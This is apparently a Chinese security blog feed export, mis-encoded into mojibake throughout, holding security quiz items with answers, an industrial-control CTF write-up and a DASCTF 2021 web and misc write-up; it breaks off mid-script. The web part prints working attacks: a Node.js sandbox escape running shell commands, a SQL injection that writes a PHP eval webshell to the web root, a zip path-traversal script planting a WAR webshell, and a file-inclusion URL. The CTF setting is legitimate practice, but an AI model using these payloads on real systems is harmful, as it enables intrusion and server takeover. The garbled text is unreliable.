é™¤/etc/cron.d/cron.denyæ–‡ä»¶åï¼Œ001å’Œ002ç”¨æˆ·éƒ½å¯ä»¥åˆ›å»ºã€ç¼–è¾‘ã€æ˜¾ç¤ºå’Œåˆ é™¤crontabæ–‡ä»¶</p><p>ä»¥ä¸‹å“ªäº›æœåŠ¡ä¸¥æ ¼ç¦æ­¢å·¥ä¸šæ§åˆ¶ç³»ç»Ÿé¢å‘äº’è”ç½‘å¼€é€šï¼Ÿï¼ˆBACDï¼‰</p><p>A FTP</p><p>B HTTP</p><p>C Telnet</p><p>D E-MAIL</p><p>é©»ç•™åœ¨å¤šä¸ªç½‘ç»œè®¾å¤‡ä¸Šçš„ç¨‹åºåœ¨çŸ­æ—¶é—´å†…åŒæ—¶äº§ç”Ÿå¤§é‡çš„è¯·æ±‚æ¶ˆæ¯å†²å‡»æŸ Web æœåŠ¡å™¨ï¼Œå¯¼è‡´è¯¥æœåŠ¡å™¨ä¸å ªé‡è´Ÿï¼Œæ— æ³•æ­£å¸¸å“åº”å…¶ä»–åˆæ³•ç”¨æˆ·çš„è¯·æ±‚ï¼Œè¿™å±äºï¼ˆCï¼‰</p><p>A ç½‘ä¸Šå†²æµª</p><p>B ä¸­é—´äººæ”»å‡»</p><p>C DDoSæ”»å‡»</p><p>D MACæ”»å‡»</p><p>ä¸ºIPsecæœåŠ¡çš„æ€»å…±æœ‰ä¸‰ä¸ªåè®®åˆ†åˆ«æ˜¯ï¼Ÿï¼ˆDAC ï¼‰</p><p>A ESPåè®®</p><p>B SETåè®®</p><p>C IKEåè®®</p><p>D AHåè®®</p><p>Solaridç³»ç»Ÿä¸­ï¼Œæ”»å‡»è€…åœ¨ç³»ç»Ÿä¸­å¢åŠ è´¦æˆ·ä¼šæ”¹å˜å“ªäº›æ–‡ä»¶ï¼Ÿï¼ˆCBï¼‰</p><p>A hosts</p><p>B passwd</p><p>C shadow</p><p>D inetd,conf</p><p>mimikatzæ˜¯ä¸€æ¬¾æå–windowså£ä»¤çš„å·¥å…·ï¼Œå®ƒä¸èƒ½ä»ï¼ˆDABï¼‰è¿›ç¨‹ä¸­æå–å£ä»¤ã€‚</p><p>A iexplore</p><p>B svchost</p><p>C lsass</p><p>D explorer</p><p>ITç³»ç»Ÿè½¯ä»¶è®¾è®¡ä¸­åº”å½“è€ƒè™‘å¹¶æ‰§è¡Œå®‰å…¨å®¡è®¡åŠŸèƒ½ï¼Œè¯¦ç»†è®°å½•è®¿é—®ä¿¡æ¯çš„æ´»åŠ¨ï¼ŒåŒ…æ‹¬ï¼ˆBACD ï¼‰ã€‚</p><p>A åº”ç”¨ç³»ç»Ÿåº”å½“é…ç½®å•ç‹¬çš„å®¡è®¡æ•°æ®åº“ï¼Œå®¡è®¡è®°å½•åº”å•ç‹¬å­˜æ”¾ï¼Œå¹¶è®¾ç½®ä¸¥æ ¼çš„è¾¹ç•Œè®¿é—®æ§åˆ¶ï¼Œåªæœ‰å®‰å…¨ç®¡ç†äººå‘˜æ‰èƒ½å¤Ÿçœ‹åˆ°å®¡è®¡è®°å½•</p><p>B è®°å½•çš„æ´»åŠ¨ä»¥æ˜¯å¦æœ‰æ•°æ®çš„ä¿®æ”¹ã€åº”ç”¨ç¨‹åºçš„å¼‚å¸¸å…³é—­ã€å¼‚å¸¸åˆ é™¤è§¦å‘</p><p>C ä¿¡æ¯ç³»ç»Ÿçš„å®¡è®¡åŠŸèƒ½åŒ…æ‹¬ï¼šäº‹ä»¶æ—¥æœŸã€æ—¶é—´ã€å‘èµ·è€…ä¿¡æ¯ã€ç±»å‹ã€æè¿°å’Œç»“æœ</p><p>D åº”ç”¨ç³»ç»Ÿçš„å®¡è®¡è¿›ç¨‹ä¸ºåå°å¤„ç†ï¼Œä¸åº”ç”¨ç³»ç»Ÿè¿è¡ŒåŒæ­¥è¿›è¡Œï¼Œå¹¶ä¸”å¯¹äºå®¡è®¡è¿›ç¨‹åº”å½“æ¶‰åŠç›¸åº”çš„å®ˆæŠ¤è¿›ç¨‹ï¼Œä¸€æ—¦å‡ºç°å¼‚å¸¸åœæ­¢ç³»ç»Ÿå¯é‡æ–°å¯åŠ¨å®¡è®¡è¿›ç¨‹ï¼Œä»è€Œä¿éšœå®¡è®¡çš„â€œå®Œæ•´æ€§â€</p><p>Oracleä¸­å¦‚ä½•è®¾ç½® audit trailå®¡è®¡ï¼Œæ­£ç¡®çš„è¯´æ³•æ˜¯ï¼šï¼ˆ DCB ï¼‰</p><p>A Oracleä¸æ”¯æŒå¯¹ audit trailçš„å®¡è®¡</p><p>B åœ¨è®¾ç½® audit trailå®¡è®¡å‰ï¼Œè¦ä¿è¯å·²ç»æ‰“å¼€ Oracleçš„å®¡è®¡æœºåˆ¶</p><p>C ä»¥ SYSDBAèº«ä»½ä½¿ç”¨ AUDIT ALL ON SYS.AUD$ BY ACCESSï¼Œè¯­å¥å¯¹ audit trailå®¡è®¡</p><p>D åœ¨ init.oraæ–‡ä»¶ä¸­è®¾ç½®â€œaudit_trail = trueâ€æˆ–è€…â€œaudit_trail = dbâ€</p><p>å¦‚æœ <a href="http://xxx.com/news.action?id=1">http://xxx.com/news.action?id=1</a> ?id=1 and 1=1 ?id=1 and len(â€˜aâ€™)=1 ?id=1 and substring(â€˜abâ€™,0,1)=â€™aâ€™ è¿”å›ç»“æœå‡ç›¸åŒï¼Œå¯ä»¥åˆ¤æ–­å‡ºæœåŠ¡å™¨ ï¼ˆDAï¼‰</p><p>A ä½¿ç”¨äº†mysqlæ•°æ®åº“</p><p>B ä½¿ç”¨äº†SQL serveræ•°æ®åº“</p><p>C ä½¿ç”¨äº†Oracleæ•°æ®åº“</p><p>D ä½¿ç”¨äº†Strut2æ¡†æ¶</p><h2 id="åˆ¤æ–­é¢˜"><a href="#åˆ¤æ–­é¢˜" class="headerlink" title="åˆ¤æ–­é¢˜"></a><strong>åˆ¤æ–­é¢˜</strong></h2><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œååº”ç”¨çš„ç»„ç­–ç•¥é…ç½®å°†è¦†ç›–ä¹‹å‰å…ˆåº”ç”¨çš„ç»„ç­–ç•¥é…ç½®ã€‚</p><p>æ­£ç¡®ç­”æ¡ˆï¼šå¯¹</p><p>P2DR2 å®‰å…¨æ¨¡å‹åŒ…å«å®‰å…¨ç­–ç•¥ã€é˜²æŠ¤ã€æ£€æµ‹ã€å“åº”ã€æ¢å¤è¿™äº”ä¸ªç¯èŠ‚ã€‚</p><p>æ­£ç¡®ç­”æ¡ˆï¼šå¯¹</p><p>IP å¤´ä¸­éœ€è¦æŒ‡æ˜å‘é€æ–¹å’Œæ¥æ”¶æ–¹çš„æºç«¯å£å·å’Œç›®çš„ç«¯å£å·ã€‚</p><p>æ­£ç¡®ç­”æ¡ˆï¼šé”™</p><p>ä¸ºäº†åº”ç”¨ VTP åè®®ï¼Œéœ€è¦å…ˆåˆ›å»ºä¸€ä¸ª VTP ç®¡ç†åŸŸï¼Œä¸ºäº†ä½¿ç®¡ç†åŸŸæ›´å®‰å…¨ï¼ŒåŸŸä¸­æ¯ä¸ªäº¤ æ¢æœºéƒ½éœ€è¦é…ç½®åŸŸåå’Œå£ä»¤ï¼Œå¹¶ä¸”åŸŸåå’Œå£ä»¤å¿…é¡»ç›¸åŒã€‚</p><p>æ­£ç¡®ç­”æ¡ˆï¼šå¯¹</p><p>RIP åè®®ä¸­ï¼Œè·¯ç”±å™¨ä¸Šé…ç½®è¢«åŠ¨æ¥å£ï¼Œåœ¨è¢«åŠ¨æ¥å£ä¸Šå¯ä»¥å®Œå…¨é˜»æ­¢å‘é€è·¯ç”±æ›´æ–°,ä»è€Œ èŠ‚çœç½‘ç»œå¸¦å®½ã€‚</p><p>æ­£ç¡®ç­”æ¡ˆï¼šå¯¹</p><p>RIP åè®®æ˜¯æœ€æ—©çš„è·ç¦»çŸ¢é‡è·¯ç”±åè®®ï¼Œç”±äºæ›´ä¸ºé«˜çº§è·¯ç”±åè®®çš„å‡ºç°ï¼Œå®ƒå› ä¸ºä¸å…·å¤‡ å¤æ‚çš„åŠŸèƒ½è€Œè¢«ç§°ä¸ºâ€œå³å°†è¢«æ·˜æ±°çš„åè®®â€</p><p>æ­£ç¡®ç­”æ¡ˆï¼šé”™</p><p>RIP åè®®ä¸­ï¼Œè·¯ç”±å™¨ä¸Šé…ç½®è¢«åŠ¨æ¥å£ï¼Œåœ¨è¢«åŠ¨æ¥å£ä¸Šå¯ä»¥å®Œå…¨é˜»æ­¢å‘é€è·¯ç”±æ›´æ–°,ä»è€Œ èŠ‚çœç½‘ç»œå¸¦å®½ã€‚</p><p>æ­£ç¡®ç­”æ¡ˆï¼šå¯¹</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œååº”ç”¨çš„ç»„ç­–ç•¥é…ç½®å°†è¦†ç›–ä¹‹å‰å…ˆåº”ç”¨çš„ç»„ç­–ç•¥é…ç½®ã€‚</p><p>æ­£ç¡®ç­”æ¡ˆï¼šå¯¹</p><p>P2DR2 å®‰å…¨æ¨¡å‹åŒ…å«å®‰å…¨ç­–ç•¥ã€é˜²æŠ¤ã€æ£€æµ‹ã€å“åº”ã€æ¢å¤è¿™äº”ä¸ªç¯èŠ‚ã€‚</p><p>æ­£ç¡®ç­”æ¡ˆï¼šå¯¹</p><p>ICMP åè®®ï¼Œåˆç§°äº’è”ç½‘æ§åˆ¶æ¶ˆæ¯åè®®ï¼Œå…¶ç›®çš„æ˜¯ç”¨äº TCP/IP ç½‘ç»œä¸­å‘é€æ§åˆ¶æ¶ˆæ¯ï¼Œ æä¾›å¯èƒ½å‘ç”Ÿåœ¨é€šä¿¡ç¯å¢ƒä¸­çš„é—®é¢˜åé¦ˆï¼Œå±äº IP å±‚åè®®ã€‚</p><p>æ­£ç¡®ç­”æ¡ˆï¼šå¯¹</p><p>CDP åè®®æ˜¯ä¸€ç§è®¾å¤‡å‘ç°åè®®ï¼Œå®ƒé€šè¿‡ç›´è¿çš„ä¸¤ä¸ªè®¾å¤‡ä¹‹é—´å®šæœŸå‘é€ hello ä¿¡æ¯æ¥ç»´ æŒé‚»å±…å…³ç³»ã€‚</p><p>æ­£ç¡®ç­”æ¡ˆï¼šå¯¹</p><p>ä¸ºäº†åº”ç”¨ VTP åè®®ï¼Œéœ€è¦å…ˆåˆ›å»ºä¸€ä¸ª VTP ç®¡ç†åŸŸï¼Œä¸ºäº†ä½¿ç®¡ç†åŸŸæ›´å®‰å…¨ï¼ŒåŸŸä¸­æ¯ä¸ªäº¤ æ¢æœºéƒ½éœ€è¦é…ç½®åŸŸåå’Œå£ä»¤ï¼Œå¹¶ä¸”åŸŸåå’Œå£ä»¤å¿…é¡»ç›¸åŒã€‚</p><p>æ­£ç¡®ç­”æ¡ˆï¼šå¯¹</p><p>ECC ä¸ RSA ç›¸æ¯”ï¼Œå¯ä»¥ç”¨å°‘å¾—å¤šçš„æ¯”ç‰¹å¤§å°å–å¾—å’Œ RSA ç›¸ç­‰çš„å®‰å…¨æ€§ï¼Œå› æ­¤å¯ä»¥å‡å°‘ å¼€é”€ã€‚</p><p>æ­£ç¡®ç­”æ¡ˆï¼šå¯¹</p><p>é€šé…ç¬¦æ©ç ä¸­çš„â€œ1â€è¡¨ç¤ºå¿½ç•¥ IP åœ°å€ä¸­å¯¹åº”çš„ä½ï¼Œè€Œâ€œ0â€åˆ™è¡¨ç¤ºè¯¥ä½å¿…é¡»åŒ¹é…ã€‚</p><p>æ­£ç¡®ç­”æ¡ˆï¼šå¯¹</p><p>åœ¨ç‰¹å®šçš„æƒ…å†µä¸‹ï¼Œå½“è·¯ç”±å™¨æ£€æµ‹åˆ°ä¸€å°æœºå™¨ä½¿ç”¨éä¼˜åŒ–è·¯ç”±çš„æ—¶å€™ï¼Œå®ƒä¼šå‘è¯¥ä¸»æœºå‘ é€ä¸€ä¸ª ICMP é‡å®šå‘æŠ¥æ–‡ï¼Œè¯·æ±‚ä¸»æœºæ”¹å˜è·¯ç”±ã€‚</p><p>æ­£ç¡®ç­”æ¡ˆï¼šå¯¹</p><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a><strong>CTF</strong></h1><h2 id="é­åˆ°é»‘å®¢æ”»å‡»"><a href="#é­åˆ°é»‘å®¢æ”»å‡»" class="headerlink" title="é­åˆ°é»‘å®¢æ”»å‡»"></a>é­åˆ°é»‘å®¢æ”»å‡»</h2><blockquote><p>æŸå·¥å‚PLCé­å—é»‘å®¢æ”»å‡»ï¼Œå·¥ç¨‹å¸ˆé€šè¿‡äº¤æ¢æœºæ•è·äº†è¿™æ®µæ”»å‡»æµé‡1.pcapï¼Œè¯•åˆ†ææµé‡ä¸­é»‘å®¢æ”»å‡»ç•™ä¸‹çš„flag<br>è¯·å°†ç­”æ¡ˆåŒ…è£¹flag{XXXX}<br><a href="https://pan.baidu.com/s/1T_9lg9pHEL0FrQoVwGuiIw"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼š08unï¼‰</p></blockquote><p>æ ¹æ®é¢˜ç›®æˆ‘ä»¬å…ˆçœ‹çœ‹tcpæµæ˜¯å¦è—æœ‰ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯ï¼Œè¿›è€Œå‘ç°äº†ä¸€ä¸²å¯ç–‘çš„è«æ–¯ç ï¼Œè§£å¯†å¾—åˆ°flagï¼šflag{HACKFUN}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202109091800001.png"></p><h2 id="å·¥æ§ç½‘ç»œé­åˆ°æ”»å‡»"><a href="#å·¥æ§ç½‘ç»œé­åˆ°æ”»å‡»" class="headerlink" title="å·¥æ§ç½‘ç»œé­åˆ°æ”»å‡»"></a>å·¥æ§ç½‘ç»œé­åˆ°æ”»å‡»</h2><blockquote><p>å‡å¦‚ä½ æ˜¯æŸæ”»å‡»è€…å…¥ä¾µäº†èœå·¥å‚å·¥æ§ç½‘ç»œï¼Œå¹¶å¾—åˆ°äº†scadaä¸PLCäº¤äº’çš„æµé‡2.pcapï¼Œå·²çŸ¥è¿™æ®µæµé‡ä¸­floatå€¼125.5ä»£è¡¨ä¼ é€å¸¦è½¬é€Ÿï¼Œè¯·åˆ†æå‡ºè¿™ä¸ªå€¼æ‰€åœ¨å¯„å­˜å™¨çš„èµ·å§‹ä½ç½®åœ°å€?<br>è¯·å°†ç­”æ¡ˆåŒ…å–flag{XXX}<br><a href="https://pan.baidu.com/s/1UzeIo4rYmpg6mx98b1fNUQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼š0gylï¼‰</p></blockquote><p>è€ƒå¯Ÿè¥¿é—¨å­S7é€šä¿¡åè®®åº•å±‚åŸç†åŠæŠ“åŒ…åˆ†æ</p><p>çŒœæµ‹è§£é¢˜æ€è·¯åº”è¯¥æ˜¯é¦–å…ˆæˆ‘ä»¬éœ€è¦äº†è§£ä¸€ä¸‹S7åè®®çš„åŸç†æ˜¯å•¥ï¼Œç¬¬å‡ ä½ï¼Œå¯¹åº”çš„ä»€ä¹ˆåŠŸèƒ½ï¼Œç„¶åæ‰¾åˆ°æ•°æ®ä¼ è¾“ä½ï¼Œé‚£ä¸€ä½è®°å½•ä¸‹æ¥å°±æ˜¯äº†â€¦â€¦</p><p>ç»“æœæœ€åå¬è¯´flagå°±åœ¨tcpç¬¬äºŒä¸ªæµé‡Œçš„é‚£å­—ç¬¦ä¸²flag{INGFORFUN}ï¼ˆè¿™ä¸ªå°±æ˜¯S7æµé‡é‡Œé¢ï¼Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202109091800021.JPG"></p><h2 id="å·¥æ§åè®®åˆ†æ"><a href="#å·¥æ§åè®®åˆ†æ" class="headerlink" title="å·¥æ§åè®®åˆ†æ"></a>å·¥æ§åè®®åˆ†æ</h2><blockquote><p><a href="https://pan.baidu.com/s/1jMwePTPdPuvPFNiQDFxSxg"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šjg8nï¼‰</p></blockquote><p>å»å¹´çš„åŸé¢˜ï¼Œç”šè‡³flagéƒ½æ²¡æ”¹ï¼Œè€ƒå¯Ÿs7commåè®®ï¼ˆä½†æ˜¯å»å¹´åŸºæœ¬å…¨ç¨‹æ‘¸é±¼æ²¡å•¥å°è±¡å¯¼è‡´æ¯”èµ›çš„æ—¶å€™æ²¡åšå‡ºæ¥.jpg<br>ç›´æ¥è¿‡æ»¤s7commï¼Œæ ¹æ®åè®®æ‰¾åˆ°é•¿åº¦ä¸º91çš„é‚£ä¸ªå­—ç¬¦å°±æ˜¯å¯¹åº”çš„flagï¼šflag{iloveS7Comm}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202109091800031.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥æ§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF July X CBCTF 4th</title>
      <link href="2021/08/02/2021DASCTF%20July%20X%20CBCTF%204th/"/>
      <url>2021/08/02/2021DASCTF%20July%20X%20CBCTF%204th/</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h3><blockquote><p>ä½ çœŸçš„ä¼š nodejs å—ï¼Ÿ</p></blockquote><p>éšä¾¿æ³¨å†Œä¸€ä¸ªå·ç™»å½•è¿›å»ï¼Œç„¶åå†éšä¾¿æ·»åŠ ä¸ªé¡¹ç›®ï¼Œå¹¶åœ¨é¡¹ç›®ä¸­éšä¾¿æ·»åŠ ä¸ªæ¥å£ã€‚</p><p>æ¥ç€è¿›å…¥è®¾ç½®æ‰¾åˆ°å…¨å±€mockè„šæœ¬ï¼Œè¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹ç›®å½•</span><br><span class="line">const sandbox &#x3D; this</span><br><span class="line">const ObjectConstructor &#x3D; this.constructor</span><br><span class="line">const FunctionConstructor &#x3D; ObjectConstructor.constructor</span><br><span class="line">const myfun &#x3D; FunctionConstructor(&#39;return process&#39;)</span><br><span class="line">const process &#x3D; myfun()</span><br><span class="line">mockJson &#x3D; process.mainModule.require(&quot;child_process&quot;).execSync(&quot;ls &#x2F;&quot;).toString()</span><br><span class="line"># cat flag</span><br><span class="line">const sandbox &#x3D; this</span><br><span class="line">const ObjectConstructor &#x3D; this.constructor</span><br><span class="line">const FunctionConstructor &#x3D; ObjectConstructor.constructor</span><br><span class="line">const myfun &#x3D; FunctionConstructor(&#39;return process&#39;)</span><br><span class="line">const process &#x3D; myfun()</span><br><span class="line">mockJson &#x3D; process.mainModule.require(&quot;child_process&quot;).execSync(&quot;cat &#x2F;ffffffflllllaggggg&quot;).toString()</span><br></pre></td></tr></table></figure><p>ä¿å­˜åè®¿é—®mockåœ°å€å¾—åˆ°flag</p><h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h3><blockquote><p>ç®€ç®€å•å•cat flag</p><p>hintï¼šç®¡ç†å‘˜æ›¾è®¿é—®è¿‡flag</p></blockquote><p>æ ¹æ®hintå¯çŸ¥flagæ–‡ä»¶ååœ¨æ—¥å¿—é‡Œï¼Œäºæ˜¯è®¿é—® <code>/var/log/nginx/access.log</code> å¾—åˆ°flagæ–‡ä»¶å</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021080212202545886.png"></p><p>æ¥ç€æˆ‘ä»¬å°±é€šè¿‡åŠ ä¸ªä¸å¯è§å­—ç¬¦ï¼ˆä¾‹å¦‚ <code>%ff</code>ï¼‰å³å¯ç»•è¿‡å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210802127748551.png"></p><h3 id="easythinkphp"><a href="#easythinkphp" class="headerlink" title="easythinkphp"></a>easythinkphp</h3><blockquote><p>easythinkphp</p></blockquote><p>æ£€æµ‹å‘ç°å­˜åœ¨ thinkphp 3.x Log RCE å’Œ thinkphp 3.x æ—¥å¿—æ³„éœ² è¿™ä¸¤ä¸ªæ´ï¼Œç›´æ¥ä¸€é”®getshellåæˆåŠŸè¿æ¥ä¸Šèšå‰‘</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021080212145646.png"></p><p>æœ€ååœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202108021295923155.jpg"></p><p>ç”±äºå‡ºé¢˜äººæƒé™æ²¡è®¾ç½®å¥½ï¼Œå¯ä»¥ç›´æ¥åŒ…å«åˆ° /flagï¼ˆä¸è¿‡è¿™ä¹Ÿéš¾å…ï¼Œé™¤éåªè®©rce</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?m&#x3D;Home&amp;c&#x3D;Index&amp;a&#x3D;index&amp;value[_filename]&#x3D;&#x2F;flag</span><br></pre></td></tr></table></figure><h3 id="jspxcms"><a href="#jspxcms" class="headerlink" title="jspxcms"></a>jspxcms</h3><blockquote><p><a href="http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/">http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/</a><br>é¶æœºæ¯ååˆ†é’Ÿé‡ç½®ä¸€æ¬¡ã€‚</p></blockquote><p>ç«™ç‚¹åº•ä¸‹å‘ç°æœ‰ä¸ªåå°ç™»å½•åœ°å€ï¼ŒGoogleæœç´¢å¾—çŸ¥é»˜è®¤è´¦å·ä¸ºadminï¼›å¯†ç ä¸ºç©º<br>æ¥ç€æˆ‘ä»¬å°±æˆåŠŸè¿›å…¥åå°ï¼Œé€šè¿‡æœç´¢jspxcmsåå°æ¼æ´å¾—çŸ¥æ˜¯<a href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/"><strong>zipè§£å‹åŠŸèƒ½â½¬å½•ç©¿è¶Šæ¼æ´</strong></a><br>äºæ˜¯æˆ‘ä»¬æ‰¾åˆ°ä¸Šä¼ ç‚¹ï¼Œåˆ©ç”¨ç½‘ä¸Šçš„ä¸€ä¸ªå†°èğŸæ„é€ waråŒ…ï¼ˆåšäº†é™åˆ¶æ‰§è¡Œä¸äº†jspæ–‡ä»¶) ç„¶åå†™ä¸ªè„šæœ¬ç”Ÿæˆç›®å½•ç©¿è¶Šçš„zipè¿›è¡Œä¸Šä¼ ï¼Œæ¥ç€å°†å…¶è§£å‹ï¼Œæœ€åå³å¯è®¿é—®ç›®å½•ç©¿è¶Šçš„æ–‡ä»¶ <code>/harvey/shell.jsp</code> </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202108021247154.png"></p><p>é™„ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">war = <span class="built_in">open</span>(<span class="string">&#x27;harvey.war&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">zipFile = zipfile.ZipFile(<span class="string">&quot;harvey.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">info = zipfile.ZipInfo(<span class="string">&quot;harvey.zip&quot;</span>)</span><br><span class="line">zipFile.writestr(<span class="string">&quot;../../../harvey.war&quot;</span>, war)</span><br><span class="line">zipFile.close()</span><br></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬é€šè¿‡å†°èæˆåŠŸè¿æ¥å¹¶æ‰¾åˆ°flagï¼ˆPSï¼šå†°èé»˜è®¤å¯†ç ä¸ºrebeyondï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202108021255971.png"></p><h3 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h3><blockquote><p>èµ›åšCMSï¼Œåªä¸ºå®‰å…¨è€Œç”Ÿ</p><p>hintï¼šä¿¡æ¯æœé›†æ˜¯ä¸€ä¸ªwebæ‰‹å¿…å¤‡çš„æŠ€èƒ½</p></blockquote><p>åå°æ³¨å…¥</p><p>æ‰¾åˆ°åå° <code>/admin/login.php</code>ï¼Œè¯•äº†ä¸‹å¸¸è§çš„å¼±å£ä»¤æ— æœï¼Œäºæ˜¯å°è¯•æŠ“åŒ…ï¼Œä¸Šä¼ ğŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D;admin&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;selselectect&#x2F;**&#x2F;0x3c3f70687020406576616c28245f504f53545b27686172766579275d293b3f3e,1,1,1,1&#x2F;**&#x2F;into&#x2F;**&#x2F;outfoutfileile&#x2F;**&#x2F;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;har.php&#39;&#x2F;**&#x2F;%23&amp;password&#x3D;hex&amp;code&#x3D;&amp;submit&#x3D;true&amp;submit.x&#x3D;20&amp;submit.y&#x3D;26</span><br><span class="line"></span><br><span class="line"># http:&#x2F;&#x2F;4b3d486c-68c9-4766-9522-03bc3f5367eb.node4.buuoj.cn:81&#x2F;harvey.php</span><br><span class="line"># å¯†ç ï¼šharvey</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202108021241278.png"></p><p>æœ€åèšå‰‘è¿æ¥å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210802126568771.png"></p><h3 id="jjâ€™s-camera"><a href="#jjâ€™s-camera" class="headerlink" title="jjâ€™s camera"></a>jjâ€™s camera</h3><blockquote><p>jjåœ¨æŸæ¬¡ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¸­å‘ç°äº†ä¸ªé»‘å®¢åšçš„ç½‘ç«™ï¼Œè¯·ä½¿ç”¨httpsè®¿é—®ç«™ç‚¹</p><p>hintï¼šç½‘ä¸Šèƒ½æœåˆ°æºç ï¼Œä»…ä¿®æ”¹äº†å‰ç«¯uiï¼Œæ³¨æ„æœåŠ¡å™¨çš„å“åº”</p></blockquote><p>%00 æˆªæ–­ + æ–‡ä»¶å†™å…¥</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><!--è¿™å“ªæ˜¯CTFå‘€ï¼Œåˆ†æ˜å°±æ˜¯ACMï¼--><!--éOIé€‰æ‰‹å“­äº†ï¼--><h3 id="red-vs-blue"><a href="#red-vs-blue" class="headerlink" title="red_vs_blue"></a>red_vs_blue</h3><blockquote><p>çº¢é˜Ÿå’Œè“é˜Ÿå°†å¼€å±•66è½®å¯¹æŠ—ï¼Œä½ èƒ½é¢„æµ‹å‡ºæ¯è½®å¯¹æŠ—çš„ç»“æœå—ï¼Ÿ ncè¿æ¥</p></blockquote><p>ncè¿æ¥å¾—çŸ¥æ˜¯è¿ç»­66æ¬¡ç›²çŒœç­”å¯¹çº¢è“é˜Ÿå³å¯å¾—åˆ°flagï¼Œä½†æ˜¯å®ƒæ¯è½®éƒ½æœ‰æ—¶é—´é™åˆ¶ï¼Œåœ¨è¾ƒçŸ­çš„æ—¶é—´å†…æ‰‹å·¥è§£å‡ºæ˜¯ä¸å¤ªå¯èƒ½çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å†™è„šæœ¬è·‘å‡ºæ¥flag</p><hr><p>Here are 66 AWD Games will begin!<br>The winner is between Red Team and Blue Team<br>To get the flag if you predict the results of all games successfully!</p><hr><p>é™„ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25611</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">res = [<span class="string">&#x27;r&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>)]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span 